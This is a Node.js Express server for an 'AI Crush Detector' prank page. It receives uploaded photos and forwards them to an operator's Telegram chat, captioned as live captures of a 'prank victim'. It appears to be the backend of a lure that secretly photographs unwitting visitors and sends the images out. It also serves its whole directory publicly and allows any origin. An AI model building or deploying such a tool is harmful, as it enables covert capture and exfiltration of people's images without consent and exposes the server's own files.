// Simple Express server for Telegram photo uploads
const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for file uploads
const upload = multer({
    storage: multer.memoryStorage(),
    limits: {
        fileSize: 10 * 1024 * 1024 // 10MB limit
    }
});

// Serve static files
app.use(express.static(path.join(__dirname)));

// Add CORS headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    if (req.method === 'OPTIONS') {
        res.sendStatus(200);
    } else {
        next();
    }
});

// Endpoint to send photos to Telegram
app.post('/api/send-photo', upload.single('photo'), async (req, res) => {
    try {
        console.log('📸 Photo upload request received');
        
        if (!req.file) {
            console.log('❌ No photo file in request');
            return res.status(400).json({ error: "No photo provided" });
        }

        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;

        console.log('🔑 Bot Token exists:', !!telegramBotToken);
        console.log('💬 Chat ID exists:', !!telegramChatId);

        if (!telegramBotToken || !telegramChatId) {
            console.log('❌ Telegram credentials not configured');
            return res.status(500).json({ error: "Telegram credentials not configured" });
        }

        // Create form data for Telegram API
        const https = require('https');
        const { Readable } = require('stream');
        
        // Convert buffer to readable stream
        const photoStream = new Readable();
        photoStream.push(req.file.buffer);
        photoStream.push(null);

        // Use node-fetch alternative with form data
        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', telegramChatId);
        form.append('photo', photoStream, {
            filename: 'capture.jpg',
            contentType: 'image/jpeg'
        });
        form.append('caption', '📸 Crush Detector Capture - Live from prank victim!');

        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
        
        form.submit(telegramUrl, (err, response) => {
            if (err) {
                console.error('❌ Form submit error:', err);
                return res.status(500).json({ error: "Failed to send to Telegram" });
            }

            let responseData = '';
            response.on('data', chunk => responseData += chunk);
            response.on('end', () => {
                console.log('✅ Telegram response:', responseData);
                if (response.statusCode === 200) {
                    console.log('✅ Photo sent to Telegram successfully');
                    res.json({ success: true, message: "Photo sent to Telegram" });
                } else {
                    console.error('❌ Telegram API error:', responseData);
                    res.status(500).json({ error: "Failed to send to Telegram" });
                }
            });
        });

    } catch (error) {
        console.error('❌ Error sending photo:', error);
        res.status(500).json({ error: "Internal server error" });
    }
});

// Default route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        telegram: {
            botConfigured: !!process.env.TELEGRAM_BOT_TOKEN,
            chatConfigured: !!process.env.TELEGRAM_CHAT_ID
        }
    });
});

app.listen(PORT, () => {
    console.log(`🚀 AI Crush Detector server running on port ${PORT}`);
    console.log(`📱 Telegram Bot: ${process.env.TELEGRAM_BOT_TOKEN ? 'Connected' : 'Not configured'}`);
    console.log(`💬 Chat ID: ${process.env.TELEGRAM_CHAT_ID ? 'Set' : 'Not configured'}`);
});
